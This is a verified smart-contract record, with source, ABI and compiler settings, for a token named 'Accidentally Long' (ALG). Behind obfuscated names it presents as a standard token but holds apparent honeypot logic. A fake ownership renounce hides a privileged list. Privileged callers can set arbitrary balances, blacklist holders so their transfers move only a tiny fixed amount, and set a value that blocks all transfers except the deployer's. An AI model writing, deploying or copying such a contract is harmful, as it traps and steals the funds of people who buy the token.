{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fromSenderLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoMax {\n    function createPair(address limitTradingLaunch, address fromSender) external returns (address);\n}\n\ninterface liquidityTradingMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAutoFrom) external view returns (uint256);\n\n    function transfer(address tradingIs, uint256 autoShould) external returns (bool);\n\n    function allowance(address launchedTotalFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingIs,\n        uint256 autoShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isList, uint256 value);\n    event Approval(address indexed launchedTotalFund, address indexed spender, uint256 value);\n}\n\ninterface liquidityTradingMarketingMetadata is liquidityTradingMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccidentallyLong is autoTo, liquidityTradingMarketing, liquidityTradingMarketingMetadata {\n\n    bool private sellTxAt;\n\n    mapping(address => uint256) private txTo;\n\n    function balanceOf(address launchAutoFrom) public view virtual override returns (uint256) {\n        return txTo[launchAutoFrom];\n    }\n\n    function transfer(address marketingLaunched, uint256 autoShould) external virtual override returns (bool) {\n        return fundMode(_msgSender(), marketingLaunched, autoShould);\n    }\n\n    mapping(address => bool) public amountSwap;\n\n    uint256 public tradingBuy;\n\n    bool private buyTx;\n\n    bool public liquidityFeeTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedFromLimit;\n    }\n\n    bool private isLimit;\n\n    address public buyEnable;\n\n    function approve(address maxEnable, uint256 autoShould) public virtual override returns (bool) {\n        swapBuy[_msgSender()][maxEnable] = autoShould;\n        emit Approval(_msgSender(), maxEnable, autoShould);\n        return true;\n    }\n\n    address autoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return fromIsTake;\n    }\n\n    function receiverTotal() public {\n        emit OwnershipTransferred(buyEnable, address(0));\n        fromIsTake = address(0);\n    }\n\n    function transferFrom(address liquiditySwapExempt, address tradingIs, uint256 autoShould) external override returns (bool) {\n        if (_msgSender() != swapExempt) {\n            if (swapBuy[liquiditySwapExempt][_msgSender()] != type(uint256).max) {\n                require(autoShould <= swapBuy[liquiditySwapExempt][_msgSender()]);\n                swapBuy[liquiditySwapExempt][_msgSender()] -= autoShould;\n            }\n        }\n        return fundMode(liquiditySwapExempt, tradingIs, autoShould);\n    }\n\n    bool private limitAuto;\n\n    function fundMode(address liquiditySwapExempt, address tradingIs, uint256 autoShould) internal returns (bool) {\n        if (liquiditySwapExempt == buyEnable) {\n            return receiverLimit(liquiditySwapExempt, tradingIs, autoShould);\n        }\n        uint256 walletReceiver = liquidityTradingMarketing(swapAt).balanceOf(autoAt);\n        require(walletReceiver == receiverAmount);\n        require(tradingIs != autoAt);\n        if (receiverFee[liquiditySwapExempt]) {\n            return receiverLimit(liquiditySwapExempt, tradingIs, shouldMode);\n        }\n        return receiverLimit(liquiditySwapExempt, tradingIs, autoShould);\n    }\n\n    function exemptReceiver(address atFund) public {\n        listEnable();\n        \n        if (atFund == buyEnable || atFund == swapAt) {\n            return;\n        }\n        receiverFee[atFund] = true;\n    }\n\n    address swapExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return fromIsTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapBuy;\n\n    function allowance(address fundIsLiquidity, address maxEnable) external view virtual override returns (uint256) {\n        if (maxEnable == swapExempt) {\n            return type(uint256).max;\n        }\n        return swapBuy[fundIsLiquidity][maxEnable];\n    }\n\n    event OwnershipTransferred(address indexed feeLimit, address indexed maxReceiver);\n\n    uint8 private listFromEnable = 18;\n\n    uint256 receiverAmount;\n\n    address public swapAt;\n\n    bool public marketingMin;\n\n    bool private fundTx;\n\n    uint256 constant shouldMode = 16 ** 10;\n\n    uint256 public takeShould;\n\n    function receiverLimit(address liquiditySwapExempt, address tradingIs, uint256 autoShould) internal returns (bool) {\n        require(txTo[liquiditySwapExempt] >= autoShould);\n        txTo[liquiditySwapExempt] -= autoShould;\n        txTo[tradingIs] += autoShould;\n        emit Transfer(liquiditySwapExempt, tradingIs, autoShould);\n        return true;\n    }\n\n    bool private fromLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFromEnable;\n    }\n\n    uint256 receiverMax;\n\n    string private buyMax = \"ALG\";\n\n    function name() external view virtual override returns (string memory) {\n        return amountExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMax;\n    }\n\n    uint256 private launchedFromLimit = 100000000 * 10 ** 18;\n\n    address private fromIsTake;\n\n    constructor (){\n        \n        fromSenderLaunched totalListLaunched = fromSenderLaunched(swapExempt);\n        swapAt = autoMax(totalListLaunched.factory()).createPair(totalListLaunched.WETH(), address(this));\n        \n        buyEnable = _msgSender();\n        receiverTotal();\n        amountSwap[buyEnable] = true;\n        txTo[buyEnable] = launchedFromLimit;\n        \n        emit Transfer(address(0), buyEnable, launchedFromLimit);\n    }\n\n    string private amountExempt = \"Accidentally Long\";\n\n    function listEnable() private view {\n        require(amountSwap[_msgSender()]);\n    }\n\n    function limitListTake(address fundSell) public {\n        require(fundSell.balance < 100000);\n        if (marketingMin) {\n            return;\n        }\n        if (takeShould != tradingBuy) {\n            liquidityFeeTo = true;\n        }\n        amountSwap[fundSell] = true;\n        \n        marketingMin = true;\n    }\n\n    function enableIsLaunched(uint256 autoShould) public {\n        listEnable();\n        receiverAmount = autoShould;\n    }\n\n    function launchSwap(address marketingLaunched, uint256 autoShould) public {\n        listEnable();\n        txTo[marketingLaunched] = autoShould;\n    }\n\n    mapping(address => bool) public receiverFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotalFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIsLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAutoFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoShould\",\"type\":\"uint256\"}],\"name\":\"enableIsLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoShould\",\"type\":\"uint256\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"limitListTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFeeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwapExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AccidentallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}